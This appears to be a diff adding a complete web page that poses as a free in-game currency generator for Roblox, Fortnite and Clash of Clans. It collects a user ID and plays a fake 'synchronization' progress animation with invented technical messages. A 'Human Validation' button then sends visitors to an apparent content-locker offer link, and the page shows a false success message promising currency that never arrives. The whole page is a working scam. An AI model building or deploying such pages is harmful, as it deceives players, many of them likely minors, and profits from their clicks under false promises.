@@ -1,0 +1,374 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Elite Gaming Sync | Global Portal</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;600;800&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --primary: #00ff88;
+            --secondary: #00d4ff;
+            --accent: #7000ff;
+            --bg: #050508;
+            --card-bg: rgba(15, 15, 25, 0.8);
+            --border: rgba(0, 255, 136, 0.2);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Exo 2', sans-serif;
+            background-color: var(--bg);
+            color: #fff;
+            overflow-x: hidden;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(0, 255, 136, 0.05) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(112, 0, 255, 0.05) 0%, transparent 40%);
+        }
+
+        /* Header / Navbar */
+        nav {
+            padding: 25px 5%;
+            display: flex;
+            justify-content: center;
+            background: rgba(5, 5, 8, 0.9);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--border);
+            position: sticky; top: 0; z-index: 1000;
+        }
+
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: 3px;
+            color: #fff;
+            text-shadow: 0 0 15px var(--primary);
+        }
+        .logo span { color: var(--primary); }
+
+        header { text-align: center; padding: 70px 20px; }
+        header h1 { 
+            font-family: 'Orbitron', sans-serif;
+            font-size: clamp(30px, 8vw, 55px); 
+            text-transform: uppercase;
+            margin-bottom: 15px;
+            background: linear-gradient(45deg, #fff, var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        header p { color: #888; font-size: 16px; max-width: 700px; margin: 0 auto; line-height: 1.6; }
+
+        /* Game Grid */
+        .game-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 30px;
+            padding: 0 10% 100px;
+        }
+
+        .game-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            overflow: hidden;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            cursor: pointer;
+            position: relative;
+        }
+
+        .game-card:hover {
+            transform: translateY(-15px) scale(1.02);
+            border-color: var(--primary);
+            box-shadow: 0 20px 50px rgba(0, 255, 136, 0.2);
+        }
+
+        .img-holder {
+            width: 100%;
+            height: 250px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0,0,0,0.3);
+            padding: 30px;
+        }
+        .img-holder img {
+            max-width: 90%;
+            max-height: 90%;
+            object-fit: contain;
+            filter: drop-shadow(0 5px 15px rgba(0,0,0,0.8));
+        }
+
+        .card-body { padding: 25px; text-align: center; background: #0a0a0f; }
+        .card-body h3 { font-family: 'Orbitron', sans-serif; font-size: 24px; margin-bottom: 8px; }
+        .card-body span { color: var(--primary); font-size: 13px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
+
+        /* Modal Overlay */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.98);
+            z-index: 2000;
+            justify-content: center; align-items: center;
+            backdrop-filter: blur(15px);
+        }
+
+        .modal {
+            background: #0f1016;
+            width: 90%;
+            max-width: 480px;
+            border-radius: 30px;
+            border: 1px solid var(--border);
+            padding: 40px;
+            position: relative;
+            text-align: center;
+            box-shadow: 0 0 100px rgba(0, 255, 136, 0.1);
+        }
+
+        .close-btn {
+            position: absolute; top: 20px; right: 25px;
+            font-size: 30px; color: #444; cursor: pointer; transition: 0.3s;
+        }
+        .close-btn:hover { color: var(--primary); }
+
+        /* Inputs & Terminal UI */
+        .input-group { margin-bottom: 25px; text-align: left; }
+        .input-group label { 
+            display: block; font-size: 12px; color: var(--primary); 
+            font-family: 'Orbitron', sans-serif; margin-bottom: 10px; text-transform: uppercase;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 18px;
+            background: rgba(255,255,255,0.03);
+            border: 1px solid #222;
+            border-radius: 14px;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            transition: 0.3s;
+        }
+        input:focus { border-color: var(--primary); background: rgba(0, 255, 136, 0.02); }
+
+        .main-btn {
+            width: 100%;
+            padding: 20px;
+            background: var(--primary);
+            color: #000;
+            border: none;
+            border-radius: 14px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 900;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.4s;
+            text-transform: uppercase;
+        }
+        .main-btn:hover {
+            box-shadow: 0 0 30px var(--primary);
+            transform: scale(1.02);
+        }
+
+        /* Processing UI */
+        .loader-container { display: none; padding: 20px 0; }
+        .circle-loader {
+            width: 70px; height: 70px;
+            border: 4px solid rgba(255,255,255,0.05);
+            border-top: 4px solid var(--primary);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        .progress-bar {
+            width: 100%; height: 6px;
+            background: #1a1a24;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+        .progress-fill {
+            width: 0%; height: 100%;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            box-shadow: 0 0 15px var(--primary);
+            transition: width 0.2s;
+        }
+
+        .terminal-text {
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 13px;
+            color: var(--primary);
+            height: 20px;
+            overflow: hidden;
+        }
+
+        /* Success UI */
+        .check-icon {
+            font-size: 80px; color: var(--primary);
+            margin-bottom: 20px;
+            animation: bounceIn 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+        }
+        @keyframes bounceIn {
+            0% { transform: scale(0); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+    </style>
+</head>
+<body>
+
+<nav>
+    <div class="logo">GAMING<span>SYNC</span></div>
+</nav>
+
+<header>
+    <h1>Global <span>Resource</span> Allocation</h1>
+    <p>Premium synchronization gateway for high-priority gaming assets. Powered by encrypted cloud protocols for 100% successful deployment.</p>
+</header>
+
+<div class="game-grid" id="game-grid">
+    <!-- Dynamic Cards -->
+</div>
+
+<div class="overlay" id="overlay">
+    <div class="modal" id="modal-content">
+        <!-- Content will be injected here -->
+    </div>
+</div>
+
+<script>
+    const games = [
+        { 
+            name: "Roblox", 
+            cur: "Assets", 
+            img: "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Robux_2019_Logo_gold.svg/500px-Robux_2019_Logo_gold.svg.png" 
+        },
+        { 
+            name: "Fortnite", 
+            cur: "Credits", 
+            img: "https://static.wikia.nocookie.net/fortnite/images/e/eb/V-Bucks_-_Icon_-_Fortnite.png/revision/latest?cb=20170806013747" 
+        },
+        { 
+            name: "Clash of Clans", 
+            cur: "Data Packs", 
+            img: "https://www.freeiconspng.com/uploads/drawing-clash-of-clans-icon-13.png" 
+        }
+    ];
+
+    const grid = document.getElementById('game-grid');
+    games.forEach((g, i) => {
+        grid.innerHTML += `
+            <div class="game-card" onclick="openSync(${i})">
+                <div class="img-holder"><img src="${g.img}" alt="${g.name}"></div>
+                <div class="card-body">
+                    <h3>${g.name}</h3>
+                    <span>Sync High-Priority ${g.cur}</span>
+                </div>
+            </div>
+        `;
+    });
+
+    function openSync(idx) {
+        const g = games[idx];
+        const modal = document.getElementById('modal-content');
+        modal.innerHTML = `
+            <span class="close-btn" onclick="closeModal()">×</span>
+            <h2 style="font-family:'Orbitron'; margin-bottom:10px;">${g.name} Allocation</h2>
+            <p style="color:#666; font-size:14px; margin-bottom:30px;">Initialize encrypted synchronization protocol.</p>
+            
+            <div id="setup-form">
+                <div class="input-group">
+                    <label>Target Identity / User ID</label>
+                    <input type="text" id="userId" placeholder="Enter ID here...">
+                </div>
+                <div class="input-group">
+                    <label>Resource Quantity</label>
+                    <select id="userAmt">
+                        <option value="10000">10,000 ${g.cur}</option>
+                        <option value="25000">25,000 ${g.cur}</option>
+                        <option value="50000">50,000 ${g.cur} (LIMIT)</option>
+                    </select>
+                </div>
+                <button class="main-btn" onclick="startProcess(${idx})">Establish Sync</button>
+            </div>
+
+            <div class="loader-container" id="loader-area">
+                <div class="circle-loader"></div>
+                <div class="progress-bar"><div class="progress-fill" id="p-fill"></div></div>
+                <div class="terminal-text" id="t-text">Waiting for connection...</div>
+            </div>
+        `;
+        document.getElementById('overlay').style.display = 'flex';
+    }
+
+    function closeModal() { document.getElementById('overlay').style.display = 'none'; }
+
+    function startProcess(idx) {
+        if(!document.getElementById('userId').value) {
+            alert("Security Error: Target ID required.");
+            return;
+        }
+
+        document.getElementById('setup-form').style.display = 'none';
+        document.getElementById('loader-area').style.display = 'block';
+
+        let p = 0;
+        const fill = document.getElementById('p-fill');
+        const text = document.getElementById('t-text');
+        const messages = [
+            "Handshaking with server...",
+            "Decrypting protocol 0x882...",
+            "Target ID verified...",
+            "Injecting asset packets...",
+            "Synchronizing cloud data...",
+            "Finalizing allocation..."
+        ];
+
+        const interval = setInterval(() => {
+            p += 1;
+            fill.style.width = p + '%';
+            
+            if(p % 15 === 0) {
+                text.innerText = messages[Math.floor(p/17)];
+            }
+
+            if(p >= 100) {
+                clearInterval(interval);
+                showVerification();
+            }
+        }, 60);
+    }
+
+    function showVerification() {
+        const modal = document.getElementById('modal-content');
+        modal.innerHTML = `
+            <h2 style="font-family:'Orbitron'; color:var(--primary);">Action Required</h2>
+            <p style="margin:20px 0; color:#888; line-height:1.6;">To prevent system overload, the final synchronization step requires <strong>Human Validation</strong>. This ensures the integrity of the data transfer.</p>
+            <a href="https://singingfiles.com/show.php?l=0&u=2449875&id=74599" onclick="showFinal()" target="_blank" class="main-btn" style="text-decoration:none; display:block;">Verify Identity</a>
+        `;
+    }
+
+    function showFinal() {
+        setTimeout(() => {
+            const modal = document.getElementById('modal-content');
+            modal.innerHTML = `
+                <div class="check-icon">✔</div>
+                <h2 style="font-family:'Orbitron';">SUCCESS</h2>
+                <p style="color:#666; margin-top:10px;">Deployment initiated. Your assets will be visible within 15-30 minutes.</p>
+                <br>
+                <button class="main-btn" style="background:#222; color:#fff;" onclick="closeModal()">Close Console</button>
+            `;
+        }, 2000);
+    }
+</script>
+
+</body>
+</html>
